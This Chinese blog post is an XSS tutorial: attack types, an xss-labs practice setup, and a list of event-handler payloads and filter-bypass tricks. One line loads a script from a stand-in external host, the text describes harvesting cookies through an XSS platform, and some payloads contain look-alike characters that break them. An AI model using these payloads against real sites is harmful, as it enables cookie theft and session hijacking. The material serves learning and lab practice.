@@ -1,0 +1,900 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#447EA5">
+  <meta name="author" content="mk">
+  <meta name="keywords" content="ctf,python,java,人工智能,sql,linux">
+  
+    <meta name="description" content="XSS基础简介 XSS又叫CSS（Cross Site Script）跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。  xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数。常见的输">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mk&#39;s blog">
+<meta property="og:url" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="mk&#39;s blog">
+<meta property="og:description" content="XSS基础简介 XSS又叫CSS（Cross Site Script）跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。  xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数。常见的输">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users/zhang/AppData/Roaming/Typora/typora-user-images/image-20230311165719232.png">
+<meta property="og:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/x">
+<meta property="og:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users/zhang/AppData/Roaming/Typora/typora-user-images/image-20230311202507690.png">
+<meta property="og:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users/zhang/AppData/Roaming/Typora/typora-user-images/image-20230311205234936.png">
+<meta property="og:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314111625701.png">
+<meta property="og:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users/zhang/AppData/Roaming/Typora/typora-user-images/image-20230311211117713.png">
+<meta property="og:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users/zhang/AppData/Roaming/Typora/typora-user-images/image-20230311211336184.png">
+<meta property="og:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314113530028.png">
+<meta property="og:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314113613135.png">
+<meta property="og:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314113232825.png">
+<meta property="og:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314112958648.png">
+<meta property="og:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314214536278.png">
+<meta property="og:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314215331489.png">
+<meta property="og:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314215622412.png">
+<meta property="og:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/image-20230314215737945.png">
+<meta property="og:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users/zhang/AppData/Roaming/Typora/typora-user-images/image-20230311211432135.png">
+<meta property="og:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users/zhang/AppData/Roaming/Typora/typora-user-images/image-20230311212248550.png">
+<meta property="og:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users/zhang/AppData/Roaming/Typora/typora-user-images/image-20230311214122921.png">
+<meta property="og:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users/zhang/AppData/Roaming/Typora/typora-user-images/image-20230311214358573.png">
+<meta property="og:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users/zhang/AppData/Roaming/Typora/typora-user-images/image-20230311215448348.png">
+<meta property="og:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users/zhang/AppData/Roaming/Typora/typora-user-images/image-20230311221528661.png">
+<meta property="og:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users/zhang/AppData/Roaming/Typora/typora-user-images/image-20230311221746474.png">
+<meta property="og:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users/zhang/AppData/Roaming/Typora/typora-user-images/image-20230311221854152.png">
+<meta property="og:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users/zhang/AppData/Roaming/Typora/typora-user-images/image-20230311224056647.png">
+<meta property="article:published_time" content="2023-03-11T14:42:48.483Z">
+<meta property="article:modified_time" content="2023-03-18T04:13:13.563Z">
+<meta property="article:author" content="mk">
+<meta property="article:tag" content="ctf,python,java,人工智能,sql,linux">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users/zhang/AppData/Roaming/Typora/typora-user-images/image-20230311165719232.png">
+  
+  
+  
+  <title>mk&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>mk&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-03-11 22:42" pubdate>
+          2023年3月11日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          14k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          116 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none"></h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="XSS基础"><a href="#XSS基础" class="headerlink" title="XSS基础"></a>XSS基础</h2><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p> XSS又叫CSS（Cross Site Script）跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p>
+<p> xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数。<br>常见的输出函数有： echo printf print print_r sprintf die var-dump var_export.</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）。<br>诱使受害者打开受到攻击的服务器URL。<br>受害者在Web浏览器中打开URL，恶意脚本执行。</p>
+<h2 id="攻击类型"><a href="#攻击类型" class="headerlink" title="攻击类型"></a>攻击类型</h2><p>反射型XSS：&lt;非持久化&gt; 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。一般是后端代码进行处理</p>
+<p>存储型XSS：&lt;持久化&gt; 代码是存储在服务器数据库中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。</p>
+<p>DOM型XSS：基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。一般是浏览器前端代码进行处理。</p>
+<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>1.挂马<br>2.盗取用户Cookie。<br>3.DOS（拒绝服务）客户端浏览器。<br>4.钓鱼攻击，高级的钓鱼技巧。<br>5.删除目标文章、恶意篡改数据、嫁祸。<br>6.劫持用户Web行为，甚至进一步渗透内网。<br>7.爆发Web2.0蠕虫。<br>8.蠕虫式的DDoS攻击。<br>9.蠕虫式挂马攻击、刷广告、刷浏量、破坏网上数据<br>10.其它安全问题</p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>1.搭建xss平台收集cookie</p>
+<p>2.对于反射型可以构造链接，当用户点击时，用户的cookie会被发到xss平台</p>
+<p>3.窃取用户的cookie后可以基于xss平台进行利用</p>
+<h2 id="搭建闯关平台-xss-labs"><a href="#搭建闯关平台-xss-labs" class="headerlink" title="搭建闯关平台(xss-labs)"></a>搭建闯关平台(xss-labs)</h2><p>首先下载源码包<a target="_blank" rel="noopener" href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a></p>
+<p>搭建PHPstudy环境，推荐使用phpstudy2018的版本</p>
+<p>将源码包解压到www目录下就可以</p>
+<p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311165719232.png" srcset="/img/loading.gif" lazyload alt="image-20230311165719232"></p>
+<h2 id="常用的标签和属性"><a href="#常用的标签和属性" class="headerlink" title="常用的标签和属性"></a>常用的标签和属性</h2><h3 id="scirpt"><a href="#scirpt" class="headerlink" title="scirpt"></a>scirpt</h3><script> 标签用于定义客户端脚本，比如 JavaScript。
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;hack&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>   #弹出hack<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/hack/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>   #弹出hack<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>        #弹出1，对于数字可以不用引号<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>      #弹出cookie<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://xxx.com/xss.js</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>  #引用外部的xss<br></code></pre></td></tr></table></figure>
+
+
+
+### img
+
+<img> 标签定义 HTML 页面中的图像。
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1);</span>&gt;</span>   <br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&quot;<span class="hljs-attr">xss</span>&quot;);&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+### input
+
+<input> 标签规定了用户可以在其中输入数据的输入字段。
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">onfocus 事件在对象获得焦点时发生：<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">alert(1);</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+竞争焦点，从而触发[onblur事件](https://so.csdn.net/so/search?q=onblur事件&spm=1001.2101.3001.7020)：
+
+<input onblur=alert(1) autofocus><input autofocus>
+
+input 标签的 autofocus 属性规定当页面加载时 元素应该自动获得焦点。可以通过autofocus属性自动执行本身的focus事件，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">&quot;alert(1);&quot;</span> <span class="hljs-attr">autofocus</span>&gt;</span><br><br>&quot; οnclick=alert(1)&gt;        这样需要点击一下输入框<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>&quot; onmouseover=alert(1)&gt;    需要鼠标划过输入框<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+### details
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">details</span>&gt;</span> 标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle 事件规定了在用户打开或关闭 <span class="hljs-tag">&lt;<span class="hljs-name">details</span>&gt;</span> 元素时触发：<br><br><span class="hljs-tag">&lt;<span class="hljs-name">details</span> <span class="hljs-attr">ontoggle</span>=<span class="hljs-string">alert(1);</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+使用details 标签的 open 属性触发ontoggle事件，无需用户去点击即可触发：
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">details</span> <span class="hljs-attr">open</span> <span class="hljs-attr">ontoggle</span>=<span class="hljs-string">alert(1);</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+### svg
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span> 标签用来在HTML页面中直接嵌入SVG 文件的代码。<br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1);</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+### video
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">οnlοadstart</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/media/hack-the-planet.mp4&quot;</span> /&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+### style
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">οnlοad</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+### body
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">οnlοad</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">οnpageshοw</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+### iframe
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span>&gt;</span> 标签会创建包含另外一个文档的内联框架。  <br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1);</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+## 常见绕过过滤方法
+
+1.空格过滤
+
+当空格被过滤了时，我们可以用 / 来代替空格：
+
+/**/，注释符号绕过；/符号绕过；
+
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;img/src<span class="hljs-operator">=</span><span class="hljs-string">&quot;x&quot;</span>/onerror<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)<span class="hljs-comment">;&gt;</span><br><br>也可以：<br><br>&lt;img/src<span class="hljs-operator">=</span><span class="hljs-string">&quot;x&quot;</span>onerror<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)<span class="hljs-comment">;&gt;</span><br></code></pre></td></tr></table></figure>
+
+2.引号过滤
+
+如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号：
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=alert(`xss`);&gt;<br><br></code></pre></td></tr></table></figure>
+
+3.括号过滤
+
+当括号被过滤的时候可以使用throw来绕过。throw 语句用于当错误发生时抛出一个错误。
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;javascript:window.onerror=alert;throw 1&quot;</span>&gt;<br>&lt;a <span class="hljs-attribute">onmouseover</span>=<span class="hljs-string">&quot;javascript:window.onerror=alert;throw 1&gt;</span><br></code></pre></td></tr></table></figure>
+
+4.关键字过滤
+大小写绕过
+
+<sCRiPt>alert(1);
+<ImG src="x" srcset="/img/loading.gif" lazyload onerror="alert(1);">
+双写绕过
+
+<p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过</p>
+<p><scrscriptipt>alert(1);</scrscriptipt><br><imimgg srsrcc="x" onerror="alert(1);"><br>5.字符串拼接绕过</imimgg></p>
+<p>利用eval()函数，与PHP的eval()函数相同，JavaScript的eval()函数也可以计算 JavaScript 字符串，并把它作为脚本代码来执行。</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;a=&#x27;aler&#x27;;b=&#x27;t&#x27;;c=&#x27;(1)&#x27;;eval(a+b+c)&quot;</span>&gt;<br>&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;<br>// 在js中，我们可以用反引号代替单双引号<br></code></pre></td></tr></table></figure>
+
+
+<p>6.JavaScript伪协议</p>
+<p>“&gt;<a href="javascript:alert(/xss/)">                  o_n和<scr_ipt>过滤</scr_ipt></a></p>
+<p>7.<strong>单引号闭合+htmlspecialchars函数绕过</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&#x27;onmouseover=&#x27;alert(/xss/)<br><br></code></pre></td></tr></table></figure>
+
+<p>8.编码绕过</p>
+<p>常见的编码</p>
+<ul>
+<li>unicode编码</li>
+<li>url编码</li>
+<li>ascii编码</li>
+<li>hex编码</li>
+<li>base64编码</li>
+</ul>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>源代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs html"><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>反射型XSS<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;action.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span>  <span class="hljs-comment">&lt;!-- &lt;form&gt;表示文档的服务器区域，此区域中包含一个Web站点的信息控件，用于向Web服务器区域提交 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br>//后端 action.php：<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta">    $name=$_POST[&quot;name&quot;]; </span><br><span class="hljs-meta">	echo $name;</span><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>提交<script>alert('hack')</script></p>
+<p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311202507690.png" srcset="/img/loading.gif" lazyload alt="image-20230311202507690"></p>
+<p>页面直接弹出了 hack 的页面，可以看到，我们插入的语句已经被页面给执行了。</p>
